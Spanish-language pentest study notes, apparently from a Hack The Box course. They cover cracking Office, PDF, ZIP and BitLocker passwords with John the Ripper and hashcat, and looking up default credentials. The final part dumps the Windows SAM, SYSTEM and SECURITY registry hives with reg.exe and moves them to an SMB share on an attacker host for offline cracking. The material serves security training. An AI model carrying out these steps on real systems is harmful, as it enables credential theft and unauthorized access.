
## Cracking de llaves encriptadas SSH

John the ripper tiene diferentes scripts para la extraccion de hashes en archivos. Al buscar por 2jhon se puede encontrar todos los scripts.

```shell
locate 2john

/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
/usr/share/john/androidfde2john.py
/usr/share/john/ansible2john.py
/usr/share/john/apex2john.py
/usr/share/john/applenotes2john.py
/usr/share/john/aruba2john.py
/usr/share/john/atmail2john.pl
/usr/share/john/axcrypt2john.py
/usr/share/john/bestcrypt2john.py
/usr/share/john/bestcryptve2john.py
/usr/share/john/bitcoin2john.py
/usr/share/john/bitshares2john.py
/usr/share/john/bitwarden2john.py
/usr/share/john/bks2john.py
/usr/share/john/blockchain2john.py
```

Cuando ya hemos crackeado la contraseña y se nos olvida se puede volver a buscar de la siguiente manera

```bash
john {archivo} --show
```

## Cracking de documentos protegidos por contraseña

JtR incluye un script en python llamado office2john.py. Puede ser usado para extraer hashes de contraseñas de todos los formatos de documentos Office.

```shell
Asm0o@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
Asm0o@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
Asm0o@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
```

```shell
Asm0o@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
Asm0o@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
Asm0o@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```

## Cracking de archivos ZIP

Zip es un formato que a menudo es usado en entornos windows para comprimir múltiples archivo entre un archivo.

```shell
Asm0o@htb[/htb]$ zip2john ZIP.zip > zip.hash
Asm0o@htb[/htb]$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

Una vez hemos extraído el hash, se puede usar JtR para crackear y con esto descifrar la contraseña.

```shell
Asm0o@htb[/htb]$ john --wordlist=rockyou.txt zip.hash

Asm0o@htb[/htb]$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```

## Cracking de Drives encriptadas de Bitlocker

BitLocker es una característica de encriptación de disco completo desarrollada por Microsoft para el sistema operativo Windows.

```shell
Asm0o@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
Asm0o@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
Asm0o@htb[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
```

Ya con el hash obtenido es momento de usar Hashcat para crackear la contraseña, el modo asociado en hashcat con bitlocker es -m 22100.

```shell
Asm0o@htb[/htb]$ hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344385 (0.02%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2816/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidate.Engine.: Device Generator
Candidates.#1....: pirate -> soccer9
Hardware.Mon.#1..: Util:100%

Started: Sat Apr 19 17:49:05 2025
Stopped: Sat Apr 19 17:51:22 2025
```

Después de crackear la contraseña con éxito es posible acceder al drive encriptado.

## Montando drives en Linux (o macOS) de Bitlocker encriptado

Es también posible montar drives de bitlocker en OS Linux y MacOS, para hacer esto tendremos que llamar la herramienta dislocker.

```shell
Asm0o@htb[/htb]$ sudo apt-get install dislocker
```

Después de esto se debe crear dos carpetas, se usaran para montar el VHD

```shell
Asm0o@htb[/htb]$ sudo mkdir -p /media/bitlocker
Asm0o@htb[/htb]$ sudo mkdir -p /media/bitlockermount
```

Luego se usa losetup para configurar el VHD como un bucle en el dispositivo. Desencripta el drive usando dislocker y finaliza montando el volumen desencriptado.

```shell
Asm0o@htb[/htb]$ sudo losetup -f -P Backup.vhd
Asm0o@htb[/htb]$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
Asm0o@htb[/htb]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Si todo fue hecho correctamente podemos navegar hacia los archivos

```shell
Asm0o@htb[/htb]$ cd /media/bitlockermount/
Asm0o@htb[/htb]$ ls -la
```

Una vez hemos analizado los archivos montados en el drive. Podemos desmontar usando el siguiente comando

```shell
Asm0o@htb[/htb]$ sudo umount /media/bitlockermount
Asm0o@htb[/htb]$ sudo umount /media/bitlocker
```

## Credenciales por defecto

Muchos sistemas, como routers, firewalls, y base de datos vienen con credenciales por defecto. 

```shell
pip3 install defaultcreds-cheat-sheet
```

Una vez instalado podemos usar el comando creds para buscar sobre credenciales conocidas asociadas con un producto o vendedor especifico.

```shell
Asm0o@htb[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

## Ataques SAM, SYSTEM y SECURITY

Con acceso administrativo a un sistema windows, podemos intentar dumpear rápidamente los archivos asociados con la base de datos SAM, transferir los a nuestro host atacante y comenzar a crackear hashes fuera de linea.

## Colmenas de registro

Hay 3 colmenas de registro que pueden ser copias si tenemos acceso administrativo local a un sistema objetivo.

| Registry Hive   | Description                                                                                                                                                                                                 |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contiene hashes de contraseñas de cuentas de usuario locales. Estos hashes se pueden extraer y descifrar para revelar contraseñas en texto plano.                                                           |
| `HKLM\SYSTEM`   | Almacena la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Esta clave es necesaria para descifrar los hashes.                                                              |
| `HKLM\SECURITY` | Contiene información confidencial utilizada por la Autoridad de Seguridad Local (LSA), incluidas credenciales de dominio almacenadas en caché (DCC2), contraseñas de texto sin formato, claves DPAPI y más. |

## Usar reg.exe para copiar colmenas de registro

Al lanzar cmd.exe con privilegios administrativos, podemos usar reg.exe para salvar copias de los registros colmenas

```shell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

## Creando un recurso compartido con smbserver

Para crear un recurso compartido,  simplemente corremos smbserver.py  -smb2support, especifica el nombre del recurso compartido (CompData), y señalar directorio local  en nuestro host atacante donde la copia de la colmena será almacenada.

```shell
Asm0o@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez recurso esta corriendo en nuestro host atacante, podemos usar el comando move en el objetivo windows para transferir las copias colmenas al recurso.

## Moviendo copias colmenas al archivo compartido

```shell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

